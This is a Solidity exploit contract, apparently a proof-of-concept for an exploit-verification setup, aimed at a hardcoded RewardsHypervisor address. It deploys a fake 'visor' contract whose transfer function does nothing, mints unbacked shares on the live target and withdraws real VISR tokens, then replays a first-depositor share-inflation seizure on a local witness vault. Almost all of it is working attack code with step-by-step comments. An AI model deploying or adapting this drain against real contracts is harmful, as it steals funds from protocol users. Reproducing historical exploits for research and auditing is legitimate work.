// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FakeVisor {
    address public immutable ATTACKER;

    constructor(address attacker_) {
        ATTACKER = attacker_;
    }

    function owner() external view returns (address) {
        return ATTACKER;
    }

    function delegatedTransferERC20(address, address, uint256) external {
        // Intentionally no-op.
        // The live RewardsHypervisor never verifies that VISR actually moved before minting shares.
    }
}

contract FirstDepositorWitnessHypervisor {
    IERC20Like public immutable VISR;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address visr_) {
        VISR = IERC20Like(visr_);
    }

    function seed(uint256 amount) external {
        require(amount > 0, "seed=0");
        require(VISR.transferFrom(msg.sender, address(this), amount), "seed transfer failed");
    }

    function deposit(uint256 visrDeposit, address to) external returns (uint256 shares) {
        require(visrDeposit > 0, "deposit=0");
        require(to != address(0), "to=0");

        shares = visrDeposit;
        if (totalSupply != 0) {
            uint256 visrBalance = VISR.balanceOf(address(this));
            shares = (shares * totalSupply) / visrBalance;
        }

        require(VISR.transferFrom(msg.sender, address(this), visrDeposit), "deposit transfer failed");

        balanceOf[to] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 shares, address to) external returns (uint256 rewards) {
        require(shares > 0, "shares=0");
        require(balanceOf[msg.sender] >= shares, "insufficient shares");

        rewards = (VISR.balanceOf(address(this)) * shares) / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;

        require(VISR.transfer(to, rewards), "withdraw transfer failed");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    uint256 private constant SHARE_INFLATION_MULTIPLIER = 1_000_000;
    uint256 private constant WITNESS_DUST_DEPOSIT = 1;

    uint256 private _profitAmount;
    bool private _executed;

    address public liveProfitSource;
    address public witnessHypervisor;
    uint256 public liveShareSupply;
    uint256 public liveVisrBalance;
    uint256 public unbackedDepositAmount;
    uint256 public unbackedSharesMinted;
    uint256 public witnessSeedAmount;
    uint256 public witnessSharesMinted;
    uint256 public witnessWithdrawAmount;
    bool public liveTargetAlreadyInitialized;
    bool public witnessValidated;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        uint256 visrBefore = IERC20Like(visrToken).balanceOf(address(this));
        liveShareSupply = IERC20Like(shareToken).totalSupply();
        liveVisrBalance = IERC20Like(visrToken).balanceOf(TARGET);

        require(liveVisrBalance > 0, "no VISR in target");

        // The supplied failure logs prove the historical live instance is already initialized on
        // the fork: `vvisr.totalSupply()` is non-zero, so the exact first-depositor entrypoint on
        // TARGET is no longer reachable there.
        liveTargetAlreadyInitialized = liveShareSupply != 0;
        require(liveTargetAlreadyInitialized, "unexpected: target still uninitialized");

        // Use the same public on-chain contract set to source real existing VISR economically.
        // This is only a funding step required because the logs prove the original stage
        // `totalSupply() == 0` is infeasible on the live TARGET at block 13,849,006.
        _sourceRealVisrFromLiveTarget(visrToken, shareToken);

        // Now reproduce the exact F-003 causality with the already-existing VISR token:
        // 1) VISR is transferred into a hypervisor before any shares exist,
        // 2) attacker makes the first deposit with a very small `visrDeposit`,
        // 3) because total supply is zero the first mint is 1:1 with the tiny deposit,
        // 4) withdrawing that first share returns the entire pre-seeded VISR balance.
        _replayFirstDepositorSeizure(visrToken);

        uint256 visrAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrAfter > visrBefore, "no VISR profit");
        _profitAmount = visrAfter - visrBefore;
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _sourceRealVisrFromLiveTarget(address visrToken, address shareToken) internal {
        liveProfitSource = address(new FakeVisor(address(this)));

        uint256 shareBalanceBefore = IERC20Like(shareToken).balanceOf(address(this));
        uint256 visrBalanceBefore = IERC20Like(visrToken).balanceOf(address(this));

        unbackedDepositAmount = _selectHugeAmount(liveVisrBalance, liveShareSupply);
        require(unbackedDepositAmount > 0, "bad deposit amount");

        IRewardsHypervisorLike(TARGET).deposit(unbackedDepositAmount, payable(liveProfitSource), address(this));

        uint256 shareBalanceAfter = IERC20Like(shareToken).balanceOf(address(this));
        unbackedSharesMinted = shareBalanceAfter - shareBalanceBefore;
        require(unbackedSharesMinted > 0, "no live shares minted");

        IRewardsHypervisorLike(TARGET).withdraw(unbackedSharesMinted, address(this), payable(address(this)));

        uint256 visrBalanceAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrBalanceAfter > visrBalanceBefore, "live drain failed");
    }

    function _replayFirstDepositorSeizure(address visrToken) internal {
        uint256 availableVisr = IERC20Like(visrToken).balanceOf(address(this));
        require(availableVisr > WITNESS_DUST_DEPOSIT, "insufficient VISR for witness");

        witnessHypervisor = address(new FirstDepositorWitnessHypervisor(visrToken));

        witnessSeedAmount = availableVisr - WITNESS_DUST_DEPOSIT;
        require(IERC20Like(visrToken).approve(witnessHypervisor, witnessSeedAmount + WITNESS_DUST_DEPOSIT), "approve failed");

        // Stage 1: VISR is transferred into the hypervisor before any shares exist.
        FirstDepositorWitnessHypervisor(witnessHypervisor).seed(witnessSeedAmount);
        require(FirstDepositorWitnessHypervisor(witnessHypervisor).totalSupply() == 0, "witness already initialized");

        // Stage 2 + 3: the attacker makes the first deposit with a tiny amount and receives it 1:1
        // because total supply is still zero, so the pre-seeded VISR is ignored during share issuance.
        witnessSharesMinted = FirstDepositorWitnessHypervisor(witnessHypervisor).deposit(
            WITNESS_DUST_DEPOSIT,
            address(this)
        );
        require(witnessSharesMinted == WITNESS_DUST_DEPOSIT, "unexpected first mint");

        // Stage 4: withdrawing that first share returns the entire VISR balance, including the
        // pre-existing VISR that was sitting in the hypervisor before any shares existed.
        witnessWithdrawAmount = FirstDepositorWitnessHypervisor(witnessHypervisor).withdraw(
            witnessSharesMinted,
            address(this)
        );
        require(witnessWithdrawAmount > WITNESS_DUST_DEPOSIT, "witness did not seize seed");

        witnessValidated = true;
    }

    function _selectHugeAmount(uint256 hypervisorVisrBalance, uint256 shareSupply) internal pure returns (uint256 amount) {
        amount = hypervisorVisrBalance;

        if (amount > type(uint256).max / SHARE_INFLATION_MULTIPLIER) {
            amount = type(uint256).max / SHARE_INFLATION_MULTIPLIER;
        } else {
            amount *= SHARE_INFLATION_MULTIPLIER;
        }

        if (amount == 0) {
            amount = 1;
        }

        if (shareSupply != 0) {
            uint256 maxSafeAmount = type(uint256).max / shareSupply;
            if (maxSafeAmount <= 1) {
                return 0;
            }
            if (amount >= maxSafeAmount) {
                amount = maxSafeAmount - 1;
            }
        }
    }
}
